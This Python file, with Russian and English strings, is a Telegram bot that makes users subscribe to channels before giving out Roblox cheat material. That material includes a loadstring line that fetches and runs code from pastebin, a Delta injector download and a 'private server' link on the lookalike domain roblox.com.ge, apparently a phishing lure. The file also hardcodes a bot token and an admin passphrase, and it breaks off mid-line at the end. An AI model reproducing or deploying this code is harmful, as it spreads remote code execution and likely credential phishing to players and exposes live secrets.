import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users (user_id, lang) VALUES (?, 'ru')", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def set_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 'ru'

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, lang FROM users")
    users = [(row[0], row[1]) for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

def remove_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

LANG = {
    "ru": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
        "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
        "check_sub_btn": "🔍 Проверить подписку",
        "check_again_btn": "🔍 Проверить снова",
        "sub_btn": "Подписаться ✅",
        "unsub_btn": "Подписаться ❎",
        "success_check": "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:",
        "not_all_subs": "❌ Осталось подписаться:",
        "script_btn": "📜 Скрипт на все игры",
        "key_btn": "🔑 Ключ",
        "private_btn": "🔒 Приватный сервер MM2",
        "delta_btn": "📥 Скачать инжектор (Delta)",
        "script_text": "📜 Скрипт на все игры:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Твой ключ:\n\n`{key}`\n\nСкопируй и вставь в скрипт.",
        "private_text": "🔒 Приватный сервер MM2\n\n{link}",
        "delta_text": "📥 Скачать Delta Injector:\n\n{link}",
        "new_user": "🆕 Новый пользователь!\n\n🆔 ID: `{uid}`\n👤 Имя: {name}\n📛 Username: @{uname}\n👥 Всего пользователей: {count}",
        "msg_to_admin": "💬 Новое сообщение в боте\n\n👤 {name}\n📛 @{uname}\n🆔 `{uid}`\n\n📩 Сообщение: {msg}",
    },
    "en": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 To continue using the bot, please complete the following tasks!",
        "not_subscribed": "📢 Subscribe to the channels to get the script and key",
        "check_sub_btn": "🔍 Check subscription",
        "check_again_btn": "🔍 Check again",
        "sub_btn": "Subscribe ✅",
        "unsub_btn": "Subscribe ❎",
        "success_check": "✅ Subscription confirmed!\n\nChoose what you want to get:",
        "not_all_subs": "❌ Still need to subscribe:",
        "script_btn": "📜 Script for all games",
        "key_btn": "🔑 Key",
        "private_btn": "🔒 Private server MM2",
        "delta_btn": "📥 Download Injector (Delta)",
        "script_text": "📜 Script for all games:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Your key:\n\n`{key}`\n\nCopy and paste into the script.",
        "private_text": "🔒 Private server MM2\n\n{link}",
        "delta_text": "📥 Download Delta Injector:\n\n{link}",
        "new_user": "🆕 New user!\n\n🆔 ID: `{uid}`\n👤 Name: {name}\n📛 Username: @{uname}\n👥 Total users: {count}",
        "msg_to_admin": "💬 New message in bot\n\n👤 {name}\n📛 @{uname}\n🆔 `{uid}`\n\n📩 Message: {msg}",
    }
}

MESSAGES = {"broadcast_text": ""}
PHOTOS = {"start": None}

bot = telebot.TeleBot(TOKEN)

def t(user_id, key, **kwargs):
    lang = get_lang(user_id)
    text = LANG.get(lang, LANG["ru"]).get(key, key)
    return text.format(**kwargs)

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_lang_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    return keyboard

def get_channels_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(text=f"{t(user_id, 'sub_btn')} {ch['name']}", url=ch['url']))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "check_sub_btn"), callback_data="check_sub"))
    return keyboard

def get_unsub_keyboard(not_subbed, user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(text=f"{t(user_id, 'unsub_btn')} {ch['name']}", url=ch['url']))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "check_again_btn"), callback_data="check_sub"))
    return keyboard

def get_success_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "script_btn"), callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "key_btn"), callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "private_btn"), callback_data="get_private"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "delta_btn"), url=DELTA_LINK))
    return keyboard

def get_admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(types.InlineKeyboardButton("📝 Приветствие", callback_data="admin_edit_start"), types.InlineKeyboardButton("📢 Не подписан", callback_data="admin_edit_notsub"))
    keyboard.add(types.InlineKeyboardButton("🖼 Фото старт", callback_data="admin_photo_start"), types.InlineKeyboardButton("➕ Канал", callback_data="admin_add_channel"))
    keyboard.add(types.InlineKeyboardButton("➖ Канал", callback_data="admin_del_channel"), types.InlineKeyboardButton("📋 Каналы", callback_data="admin_list_channels"))
    keyboard.add(types.InlineKeyboardButton("🔑 Ключи", callback_data="admin_list_keys"), types.InlineKeyboardButton("🔑 Изменить ключи", callback_data="admin_edit_keys"))
    keyboard.add(types.InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast"), types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
    keyboard.add(types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users_list"), types.InlineKeyboardButton("🚫 Удалить юзера", callback_data="admin_del_user"))
    keyboard.add(types.InlineKeyboardButton("📨 Личное сообщение", callback_data="admin_pm"), types.InlineKeyboardButton("🔗 Изменить прив.", callback_data="admin_edit_link"))
    keyboard.add(types.InlineKeyboardButton("📜 Изменить скрипт", callback_data="admin_edit_script"), types.InlineKeyboardButton("📥 Изменить Delta", callback_data="admin_edit_delta"))
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    add_user(message.from_user.id)
    bot.send_message(message.chat.id, LANG["ru"]["lang_select"], reply_markup=get_lang_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def lang_callback(call):
    lang = call.data.replace("lang_", "")
    set_lang(call.from_user.id, lang)
    user = call.from_user
    text = t(call.from_user.id, "new_user", uid=user.id, name=user.first_name, uname=user.username or "нет", count=count_users())
    notify_admin(text)
    if PHOTOS["start"]:
        bot.send_photo(call.message.chat.id, PHOTOS["start"], caption=t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    else:
        bot.send_message(call.message.chat.id, t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: not m.text.startswith("/") and m.text != ADMIN_SECRET and m.from_user.id != ADMIN_ID)
def catch_messages(message):
    user = message.from_user
    text = t(ADMIN_ID, "msg_to_admin", name=user.first_name, uname=user.username or "нет", uid=user.id, msg=message.text)
    notify_admin(text)

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, t(message.from_user.id, "key_text", key=key), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, t(message.from_user.id, "not_subscribed"), reply_markup=get_unsub_keyboard(not_subbed, message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    text = f"🛡 *Админ панель*\n\n👥 Пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}\n\nВыбери действие:"
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа.")
        return
    action = call.data
    
    if action == "admin_stats":
        bot.send_message(call.message.chat.id, f"📊 *Статистика:*\n👥 Всего пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}", parse_mode="Markdown")
    
    elif action == "admin_users_list":
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id, "👥 Пользователей пока нет.")
        else:
            text = "\n".join(f"• `{u[0]}` ({u[1]})" for u in users[:50])
            if len(users) > 50:
                text += f"\n... и ещё {len(users) - 50}"
            bot.send_message(call.message.chat.id, f"👥 *Пользователи ({len(users)}):*\n\n{text}", parse_mode="Markdown")
    
    elif action == "admin_del_user":
        msg = bot.send_message(call.message.chat.id, "🚫 Введи ID пользователя которого хочешь удалить:")
        bot.register_next_step_handler(msg, del_user_by_id)
    
    elif action == "admin_pm":
        msg = bot.send_message(call.message.chat.id, "📨 Введи ID пользователя и сообщение:\nФормат: ID текст сообщения")
        bot.register_next_step_handler(msg, send_pm)
    
    elif action == "admin_list_channels":
        text = "\n".join(f"• @{ch['name']} → {ch['url']}" for ch in CHANNELS)
        bot.send_message(call.message.chat.id, f"📋 *Каналы:*\n{text}", parse_mode="Markdown")
    
    elif action == "admin_list_keys":
        text = "\n".join(f"• {k}" for k in KEYS)
        bot.send_message(call.message.chat.id, f"🔑 *Ключи:*\n{text}", parse_mode="Markdown")
    
    elif action == "admin_edit_keys":
        msg = bot.send_message(call.message.chat.id, "🔑 Введи новые ключи через запятую:")
        bot.register_next_step_handler(msg, save_keys)
    
    elif action == "admin_edit_link":
        msg = bot.send_message(call.message.chat.id, "🔗 Введи новую ссылку на приватный сервер:")
        bot.register_next_step_handler(msg, save_link)
    
    elif action == "admin_edit_script":
        msg = bot.send_message(call.message.chat.id, "📜 Введи новую ссылку на скрипт (pastebin):")
        bot.register_next_step_handler(msg, save_script)
    
    elif action == "admin_edit_delta":
        msg = bot.send_message(call.message.chat.id, "📥 Введи новую ссылку на Delta:")
        bot.register_next_step_handler(msg, save_delta)
    
    elif action == "admin_edit_start":
        msg = bot.send_message(call.message.chat.id, "📝 Введи новый текст для приветствия:")
        bot.register_next_step_handler(msg, save_message, "start")
    
    elif action == "admin_edit_notsub":
        msg = bot.send_message(call.message.chat.id, "📢 Введи новый текст для неподписанных:")
        bot.register_next_step_handler(msg, save_message, "not_subscribed")
    
    elif action == "admin_photo_start":
        msg = bot.send_message(call.message.chat.id, "🖼 Отправь фото для приветствия (или /skip чтобы убрать):")
        bot.register_next_step_handler(msg, save_photo)
    
    elif action == "admin_add_channel":
        msg = bot.send_message(call.message.chat.id, "➕ Введи данные канала:\nимя_канала | ссылка\nПример: mychannel | https://t.me/mychannel")
        bot.register_next_step_handler(msg, add_channel)
    
    elif action == "admin_del_channel":
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        for i, ch in enumerate(CHANNELS):
            keyboard.add(types.InlineKeyboardButton(f"❌ @{ch['name']}", callback_data=f"admin_del_{i}"))
        bot.send_message(call.message.chat.id, "➖ Выбери канал для удаления:", reply_markup=keyboard)
    
    elif action.startswith("admin_del_"):
        idx = int(action.replace("admin_del_", ""))
        if 0 <= idx < len(CHANNELS):
            deleted = CHANNELS.pop(idx)
            bot.send_message(call.message.chat.id, f"✅ Канал @{deleted['name']} удалён.")
    
    elif action == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, f"📨 Введи текст рассылки (получат {count_users()} чел.):\nИли /skip для рассылки без текста")
        bot.register_next_step_handler(msg, broadcast_step1)
    
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data in ["check_sub", "get_script", "get_key", "get_private"])
def user_callback(call):
    action = call.data
    user_id = call.from_user.id
    
    if action == "check_sub":
        not_subbed = get_unsubscribed_channels(user_id)
        if not not_subbed:
            bot.send_message(call.message.chat.id, t(user_id, "success_check"), reply_markup=get_success_keyboard(user_id))
        else:
            text = t(user_id, "not_all_subs") + "\n\n"
            for ch in not_subbed:
                text += f"❎ {ch['name']}\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed, user_id))
    
    elif action == "get_script":
        bot.send_message(call.message.chat.id, t(user_id, "script_text", script=SCRIPT_LINK), parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "get_key":
        key = random.choice(KEYS)
        bot.send_message(call.message.chat.id, t(user_id, "key_text", key=key), parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅")
    
    elif action == "get_private":
        bot.send_message(call.message.chat.id, t(user_id, "private_text", link=PRIVATE_SERVER_LINK))
        bot.answer_callback_query(call.id, "✅")

def del_user_by_id(message):
    try:
        uid = int(message.text.strip())
        remove_user(uid)
        bot.send_message(message.chat.id, f"✅ Пользователь {uid} удалён.")
    except:
        bot.send_message(message.chat.id, "❌ Неверный ID.")

def send_pm(message):
    try:
        parts = message.text.split(" ", 1)
        uid = int(parts[0])
        text = parts[1]
        bot.send_message(uid, f"📨 *Сообщение от администратора:*\n\n{text}", parse_mode="Markdown")
        bot.send_message(message.chat.id, f"✅ Отправлено пользователю {uid}")
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат. Пример: 123456789 Привет!")

def save_keys(message):
    global KEYS
    KEYS = [k.strip() for k in message.text.split(",")]
    bot.send_message(message.chat.id, f"✅ Ключи обновлены! Теперь их {len(KEYS)}:\n" + "\n".join(KEYS))

def save_link(message):
    global PRIVATE_SERVER_LINK
    PRIVATE_SERVER_LINK = message.text.strip()
    bot.send_message(message.chat.id, "✅ Ссылка на приватку обновлена!")

def save_script(message):
    global SCRIPT_LINK
    SCRIPT_LINK = message.text.strip()
    bot.send_message(message.chat.id, "✅ Ссылка на скрипт обновлена!")

def save_delta(message):
    global DELTA_LINK
    DELTA_LINK = message.text.strip()
    bot.send_message(message.chat.id, "✅ Ссылка на Delta обновлена!")

def save_message(message, msg_type):
    LANG["ru"][msg_type] = message.text
    LANG["en"][msg_type] = message.text
    bot.send_message(message.chat.id, "✅ Сообщение обновлено!")

def save_photo(message):
    if message.content_type == "photo":
        PHOTOS["start"] = message.photo[-1].file_id
        bot.send_message(message.chat.id, "✅ Фото сохранено!")
    elif message.text == "/skip":
        PHOTOS["start"] = None
        bot.send_message(message.chat.id, "✅ Фото убрано.")

def add_channel(message):
    try:
        name, url = message.text.split("|")
        CHANNELS.append({"name": name.strip().replace("@", ""), "url": url.strip()})
        bot.send_message(message.chat.id, "✅ Канал добавлен!")
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат. Пример: mychannel | https://t.me/mychannel")

def broadcast_step1(message):
    if message.text != "/skip":
        MESSAGES["broadcast_text"] = message.text
    msg = bot.send_message(message.chat.id, "🖼 Отправь фото для рассылки (или /skip):")
    bot.register_next_step_handler(msg, broadcast_step2)

def broadcast_step2(message):
    photo_id = None
    if message.content_type == "photo":
        photo_id = message.photo[-1].file_id
    elif message.text != "/skip":
        bot.send_message(message.chat.id, "❌ Отправь фото или /skip")
        return
    users = [u[0] for u in get_all_users()]
    bot.send_message(message.chat.id, f"📨 Начинаю рассылку на {len(users)} пользователей...")
    text = MESSAGES.get("broadcast_text", "")
    count = 0
    for user_id in users:
        try:
            if photo_id:
                bot.send_photo(user_id, photo_id, caption=text)
            else:
                bot.send_message(user_id, text)
            count += 1
        except:
            pass
    bot.send_message(message.chat.id, f"✅ Рассылка завершена! Отправлено: {count}/{len(users)}")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsock
